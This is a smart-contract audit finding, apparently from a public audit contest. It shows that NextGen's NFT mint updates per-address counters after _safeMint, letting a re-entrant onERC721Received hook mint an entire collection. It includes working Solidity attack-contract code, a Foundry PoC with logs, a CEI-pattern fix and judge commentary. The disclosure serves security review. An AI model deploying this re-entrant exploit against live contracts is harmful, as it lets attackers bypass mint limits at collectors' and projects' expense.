[H-01] Attacker can reenter to mint all the collection supply
Submitted bybtk, also found bysl1,836541,alexxander,ilchovski,Kose,pontifex, PetarTolev (1,2,3),ChrisTina,Tricko,DarkTower,DeFiHackLabs,immeas,Aymen0909,sces60107,phoenixV110,0xraion,0x175,trachev,3th,droptpackets,Talfao,0xJuda,r0ck3tz,smiling_heretic,stackachu,seeques,MrPotatoMagic,codynhat,audityourcontracts,ustas,jacopod,Neo_Granicen,bronze_pickaxe,PENGUN,bird-flu,EricWWFCP,ke1caM,Viktor_Cortess,The_Kakers,fibonacci,ayden,Al-Qa-qa,0xpiken,xAriextz,ubl4nk,_eperezok,degensec,flacko,evmboi32,kk_krish,ZdravkoHr,gumgumzum,turvy_fuzz,Toshii,mojito_auditor,SovaSlava,AvantGard,00xSEV,xuwinnie,SpicyMeatball,Kow,KupiaSec,VAD37, 0xAlix2 (1,2),Ruhum,0x180db,0x3b,t0x1c,Beosin,critical-or-high,innertia,nuthan2x,joesan,danielles0xG,Soul22, andy4y
An attacker can reenter theMinterContract::mintfunction, bypassing themaxCollectionPurchasescheck and minting the entire collection supply.
Proof of Concept
The vulnerability stems from the absence of theCheck Effects Interactionspattern. As seen here,NextGenCore::mintupdates thetokensMintedAllowlistAddressandtokensMintedPerAddressafter making an external call:
// Minting logic is hereif(phase==1) {tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;}else{tokensMintedPerAddress[_collectionID][_mintingAddress]++;}}
Exploitation Steps:
Attacker callsMinterContract::mintwith a malicious contract as the receiver.The malicious contract executes a craftedonERC721Received().MinterContract::mintinvokesNextGenCore::mint, which uses_safeMint()internally._safeMint()calls_recipient.onERC721Received(), leading to the minting of the complete collection supply.
An example of the attackeronERC721Received()implementation:
functiononERC721Received(address,address,uint256,bytesmemory)publicoverridereturns(bytes4) {(, ,uint256circulationSupply,uint256totalSupply, , ) =nextGenCore.retrieveCollectionAdditionalData(1);if(circulationSupply==totalSupply)returnthis.onERC721Received.selector;bytes32[]memorymerkleProof=newbytes32[](1);merkleProof[0] =bytes32(0);minterContract.mint{value:1e18}({_collectionID:1,_numberOfTokens:1,_maxAllowance:0,_tokenData:"",_mintTo:address(this),merkleProof:merkleProof,_delegator:address(0),_saltfun_o:0});returnthis.onERC721Received.selector;}
Here is a coded PoC to demonstrate the issue:
functiontestMintAllTheCollection()public{bytes32[]memorymerkleProof=setUpArrayBytes(1);merkleProof[0] =bytes32(0);addressattacker=makeAddr("attacker");vm.prank(attacker);MintAllSupplymintAllSupply=newMintAllSupply(minterContract,nextGenCore);deal(address(mintAllSupply),49e18);vm.warp(block.timestamp+1days);console.log("(Collection Circulation Supply Before)      = ",nextGenCore.viewCirSupply(1));console.log("(Balance of attacker contract Before)       = ",address(mintAllSupply).balance);console.log("(Col 1 Balance of attacker contract Before) = ",nextGenCore.balanceOf(address(mintAllSupply)));hoax(attacker,1e18);minterContract.mint{ value:1e18}({_collectionID:1,_numberOfTokens:1,_maxAllowance:0,_tokenData:"",_mintTo:address(mintAllSupply),merkleProof:merkleProof,_delegator:address(0),_saltfun_o:0});console.log("(Collection Circulation Supply After)       = ",nextGenCore.viewCirSupply(1));console.log("(Balance of attacker contract After)        = ",address(mintAllSupply).balance);console.log("(Col 1 Balance of attacker contract After)  = ",nextGenCore.balanceOf(address(mintAllSupply)));}
Logs result:
(Collection Circulation Supply Before):0(Balance of attacker contract Before):49000000000000000000(Col 1 Balance of attacker contract Before):0(Collection Circulation Supply After):50(Balance of attacker contract After):0(Col 1 Balance of attacker contract After):50
Test Setup:
Clone the repository:https://github.com/0xbtk/NextGen-Setup.git.Add the attacker’s contract in the Helpers folder from thislink.Incorporate the tests inNextGenSecurityReview.Execute:forge test --mt testMintAllTheCollection -vvv.
Recommended Mitigation Steps
We recommend followingCheck Effects InteractionsinNextGenCore::mintas follow:
if(phase==1) {tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;}else{tokensMintedPerAddress[_collectionID][_mintingAddress]++;}// Minting logic should be here}
Assessed type
Reentrancy
a2rocket (NextGen) confirmed via duplicate issue #51
0xsomeone (judge) commented:
The Warden has illustrated how a re-entrant EIP-721 hook can be exploited to bypass the allowlist/public limitations set forth for a collection.The Sponsor has confirmed the finding and I deem it valid as the code will update the minted per address mappingsafter the “safe” mint operation, thereby being susceptible to the re-entrancy described. Its severity of “high” is also deemed correct given that a main invariant of the system (mint limitations so scarcity of an NFT) can be broken arbitrarily as the re-entrancy attack can be repetitively replayed.The Warden’s submission was selected as the best due to its correct remediation relying on enforcement of the CEI pattern, short-and-sweet PoC, and overall clean submission.
0xsomeone (judge) commented:
After discussions with fellow judges, I have opted to split re-entrancy vulnerabilities into two separate instances:Absence of the CEI Pattern inNextGenCore::mintAbsence of the CEI Pattern inMinterContract::mintIn my opinion, those two constitute different vulnerabilities as they relate to different state variables. The rationale behind this “split” is that when we consider the root cause for a vulnerability to render two submissions distinct, we have to treat a re-entrancy as a desirable trait of the EVM. Additionally, we cannot assume a rational fix is the application of theReentrancyGuard::nonReentrantmodifier;the enforcement of the CEI patternis widely recognized as the “correct” way to resolve these issues.This assumption falls in line with what the Solidity documentation hasinstructed since its inception, given that the security considerations of the language clearly state that the CEI patternshould be applied and do not mention “re-entrancy” guards. As such, the root causes described in this issue are two unique ones:#1517: Absence of the CEI Pattern inNextGenCore::mint#2048: Absence of the CEI Pattern inMinterContract::mintEDIT: After further consideration, I have opted to retain only this submission as a valid of the two.The absence of the CEI pattern in #2048 leads to an incorrectgetPricebeing utilized for multiplevalidmints in a period, and no Warden identified that particular aspect that is vulnerable. As such, I have proceeded to invalidate the submission and its duplicates.